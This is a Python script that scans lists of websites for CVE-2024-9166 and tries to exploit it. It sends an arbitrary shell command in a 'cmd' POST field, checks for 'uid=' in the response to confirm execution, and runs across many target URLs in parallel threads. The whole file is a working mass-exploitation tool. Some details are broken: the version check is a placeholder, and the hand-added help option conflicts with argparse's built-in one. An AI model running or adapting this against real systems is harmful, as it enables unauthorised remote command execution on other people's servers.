import requests
from bs4 import BeautifulSoup
import re
import argparse
from concurrent.futures import ThreadPoolExecutor
import logging
import json

# Set up logging
def setup_logger(log_file):
    logging.basicConfig(filename=log_file, filemode='a', format='%(asctime)s - %(message)s', level=logging.INFO)

# Exploit function to attempt the CVE-2024-9166 vulnerability
def exploit_website(url, exploit_command, headers=None):
    exploit_payload = {
        'cmd': exploit_command  # Custom command to test for command execution
    }
    try:
        response = requests.post(url, data=exploit_payload, headers=headers)
        if response.status_code == 200 and 'uid=' in response.text:
            logging.info(f"[!] Exploit successful on {url}: {response.text}")
            print(f"[!] Exploit successful on {url}: {response.text}")
        else:
            print(f"[-] Exploit failed on {url} or site not vulnerable.")
    except Exception as e:
        print(f"[!] Exploit attempt failed on {url}: {e}")
        logging.error(f"Exploit failed on {url}: {e}")

# Check HTTP headers for signs of vulnerable software
def check_headers(url, headers=None):
    try:
        response = requests.head(url, headers=headers)
        headers = response.headers

        # Example of checking common vulnerable server versions
        if 'Server' in headers and re.search(r'vulnerable-software/1\.0', headers['Server'], re.IGNORECASE):
            print(f"[!] Vulnerable server version found in headers on {url}: {headers['Server']}")
            logging.info(f"Vulnerable headers detected on {url}: {headers['Server']}")
        else:
            print(f"[-] No vulnerable server version found in headers on {url}")
    except Exception as e:
        print(f"[!] Failed to retrieve headers from {url}: {e}")
        logging.error(f"Failed to retrieve headers from {url}: {e}")

# Function to scan a single website for various signs of vulnerability
def scan_website(url, exploit_command, headers=None):
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')

            # Searching for vulnerable patterns (e.g., the 'getcommand' function)
            if re.search(r'getcommand', soup.text, re.IGNORECASE):
                print(f"[!] Vulnerable pattern found on {url}")
                logging.info(f"Vulnerable pattern found on {url}")
            else:
                print(f"[-] No vulnerable pattern found on {url}")

            # Check HTTP headers for vulnerable software indicators
            check_headers(url, headers)

            # Try exploiting the vulnerability
            exploit_website(url, exploit_command, headers)
        else:
            print(f"[!] Could not access {url} - Status Code: {response.status_code}")
    except Exception as e:
        print(f"[!] Error scanning {url}: {e}")
        logging.error(f"Error scanning {url}: {e}")

# Function to scan websites from a file
def scan_from_file(file_path, exploit_command, headers=None, max_threads=5):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file.readlines()]

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(lambda url: scan_website(url, exploit_command, headers), urls)

# Main function to handle arguments
def main():
    parser = argparse.ArgumentParser(description='Scan websites for CVE-2024-9166 vulnerability.')
    
    # Arguments for URLs and log file
    parser.add_argument('-u', '--url', help='Single URL to scan.')
    parser.add_argument('-f', '--file', help='File containing list of URLs to scan.')
    parser.add_argument('-l', '--logfile', default='scan_log.txt', help='Log file to store scan results.')

    # Custom headers and exploitation control
    parser.add_argument('--headers', help='Custom headers in JSON format (e.g., \'{"User-Agent": "Custom-Agent"}\').', type=json.loads)
    parser.add_argument('--exploit-command', default='id', help='Custom command to test the exploit (default: "id").')

    # Control threading and scanning behavior
    parser.add_argument('--threads', type=int, default=5, help='Number of threads for scanning multiple URLs.')

    # Help command
    parser.add_argument('-h', '--help', action='help', help='Show this help message and exit.')

    args = parser.parse_args()

    if args.url and args.file:
        print("[---] Please provide either a single URL or a file with URLs, not both.")
        return

    # Set up logging
    setup_logger(args.logfile)

    # Run the scan based on the arguments provided
    if args.url:
        scan_website(args.url, args.exploit_command, headers=args.headers)
    elif args.file:
        scan_from_file(args.file, args.exploit_command, headers=args.headers, max_threads=args.threads)
    else:
        print("Please provide a URL or a file with URLs to scan.")

if __name__ == "__main__":
    main()
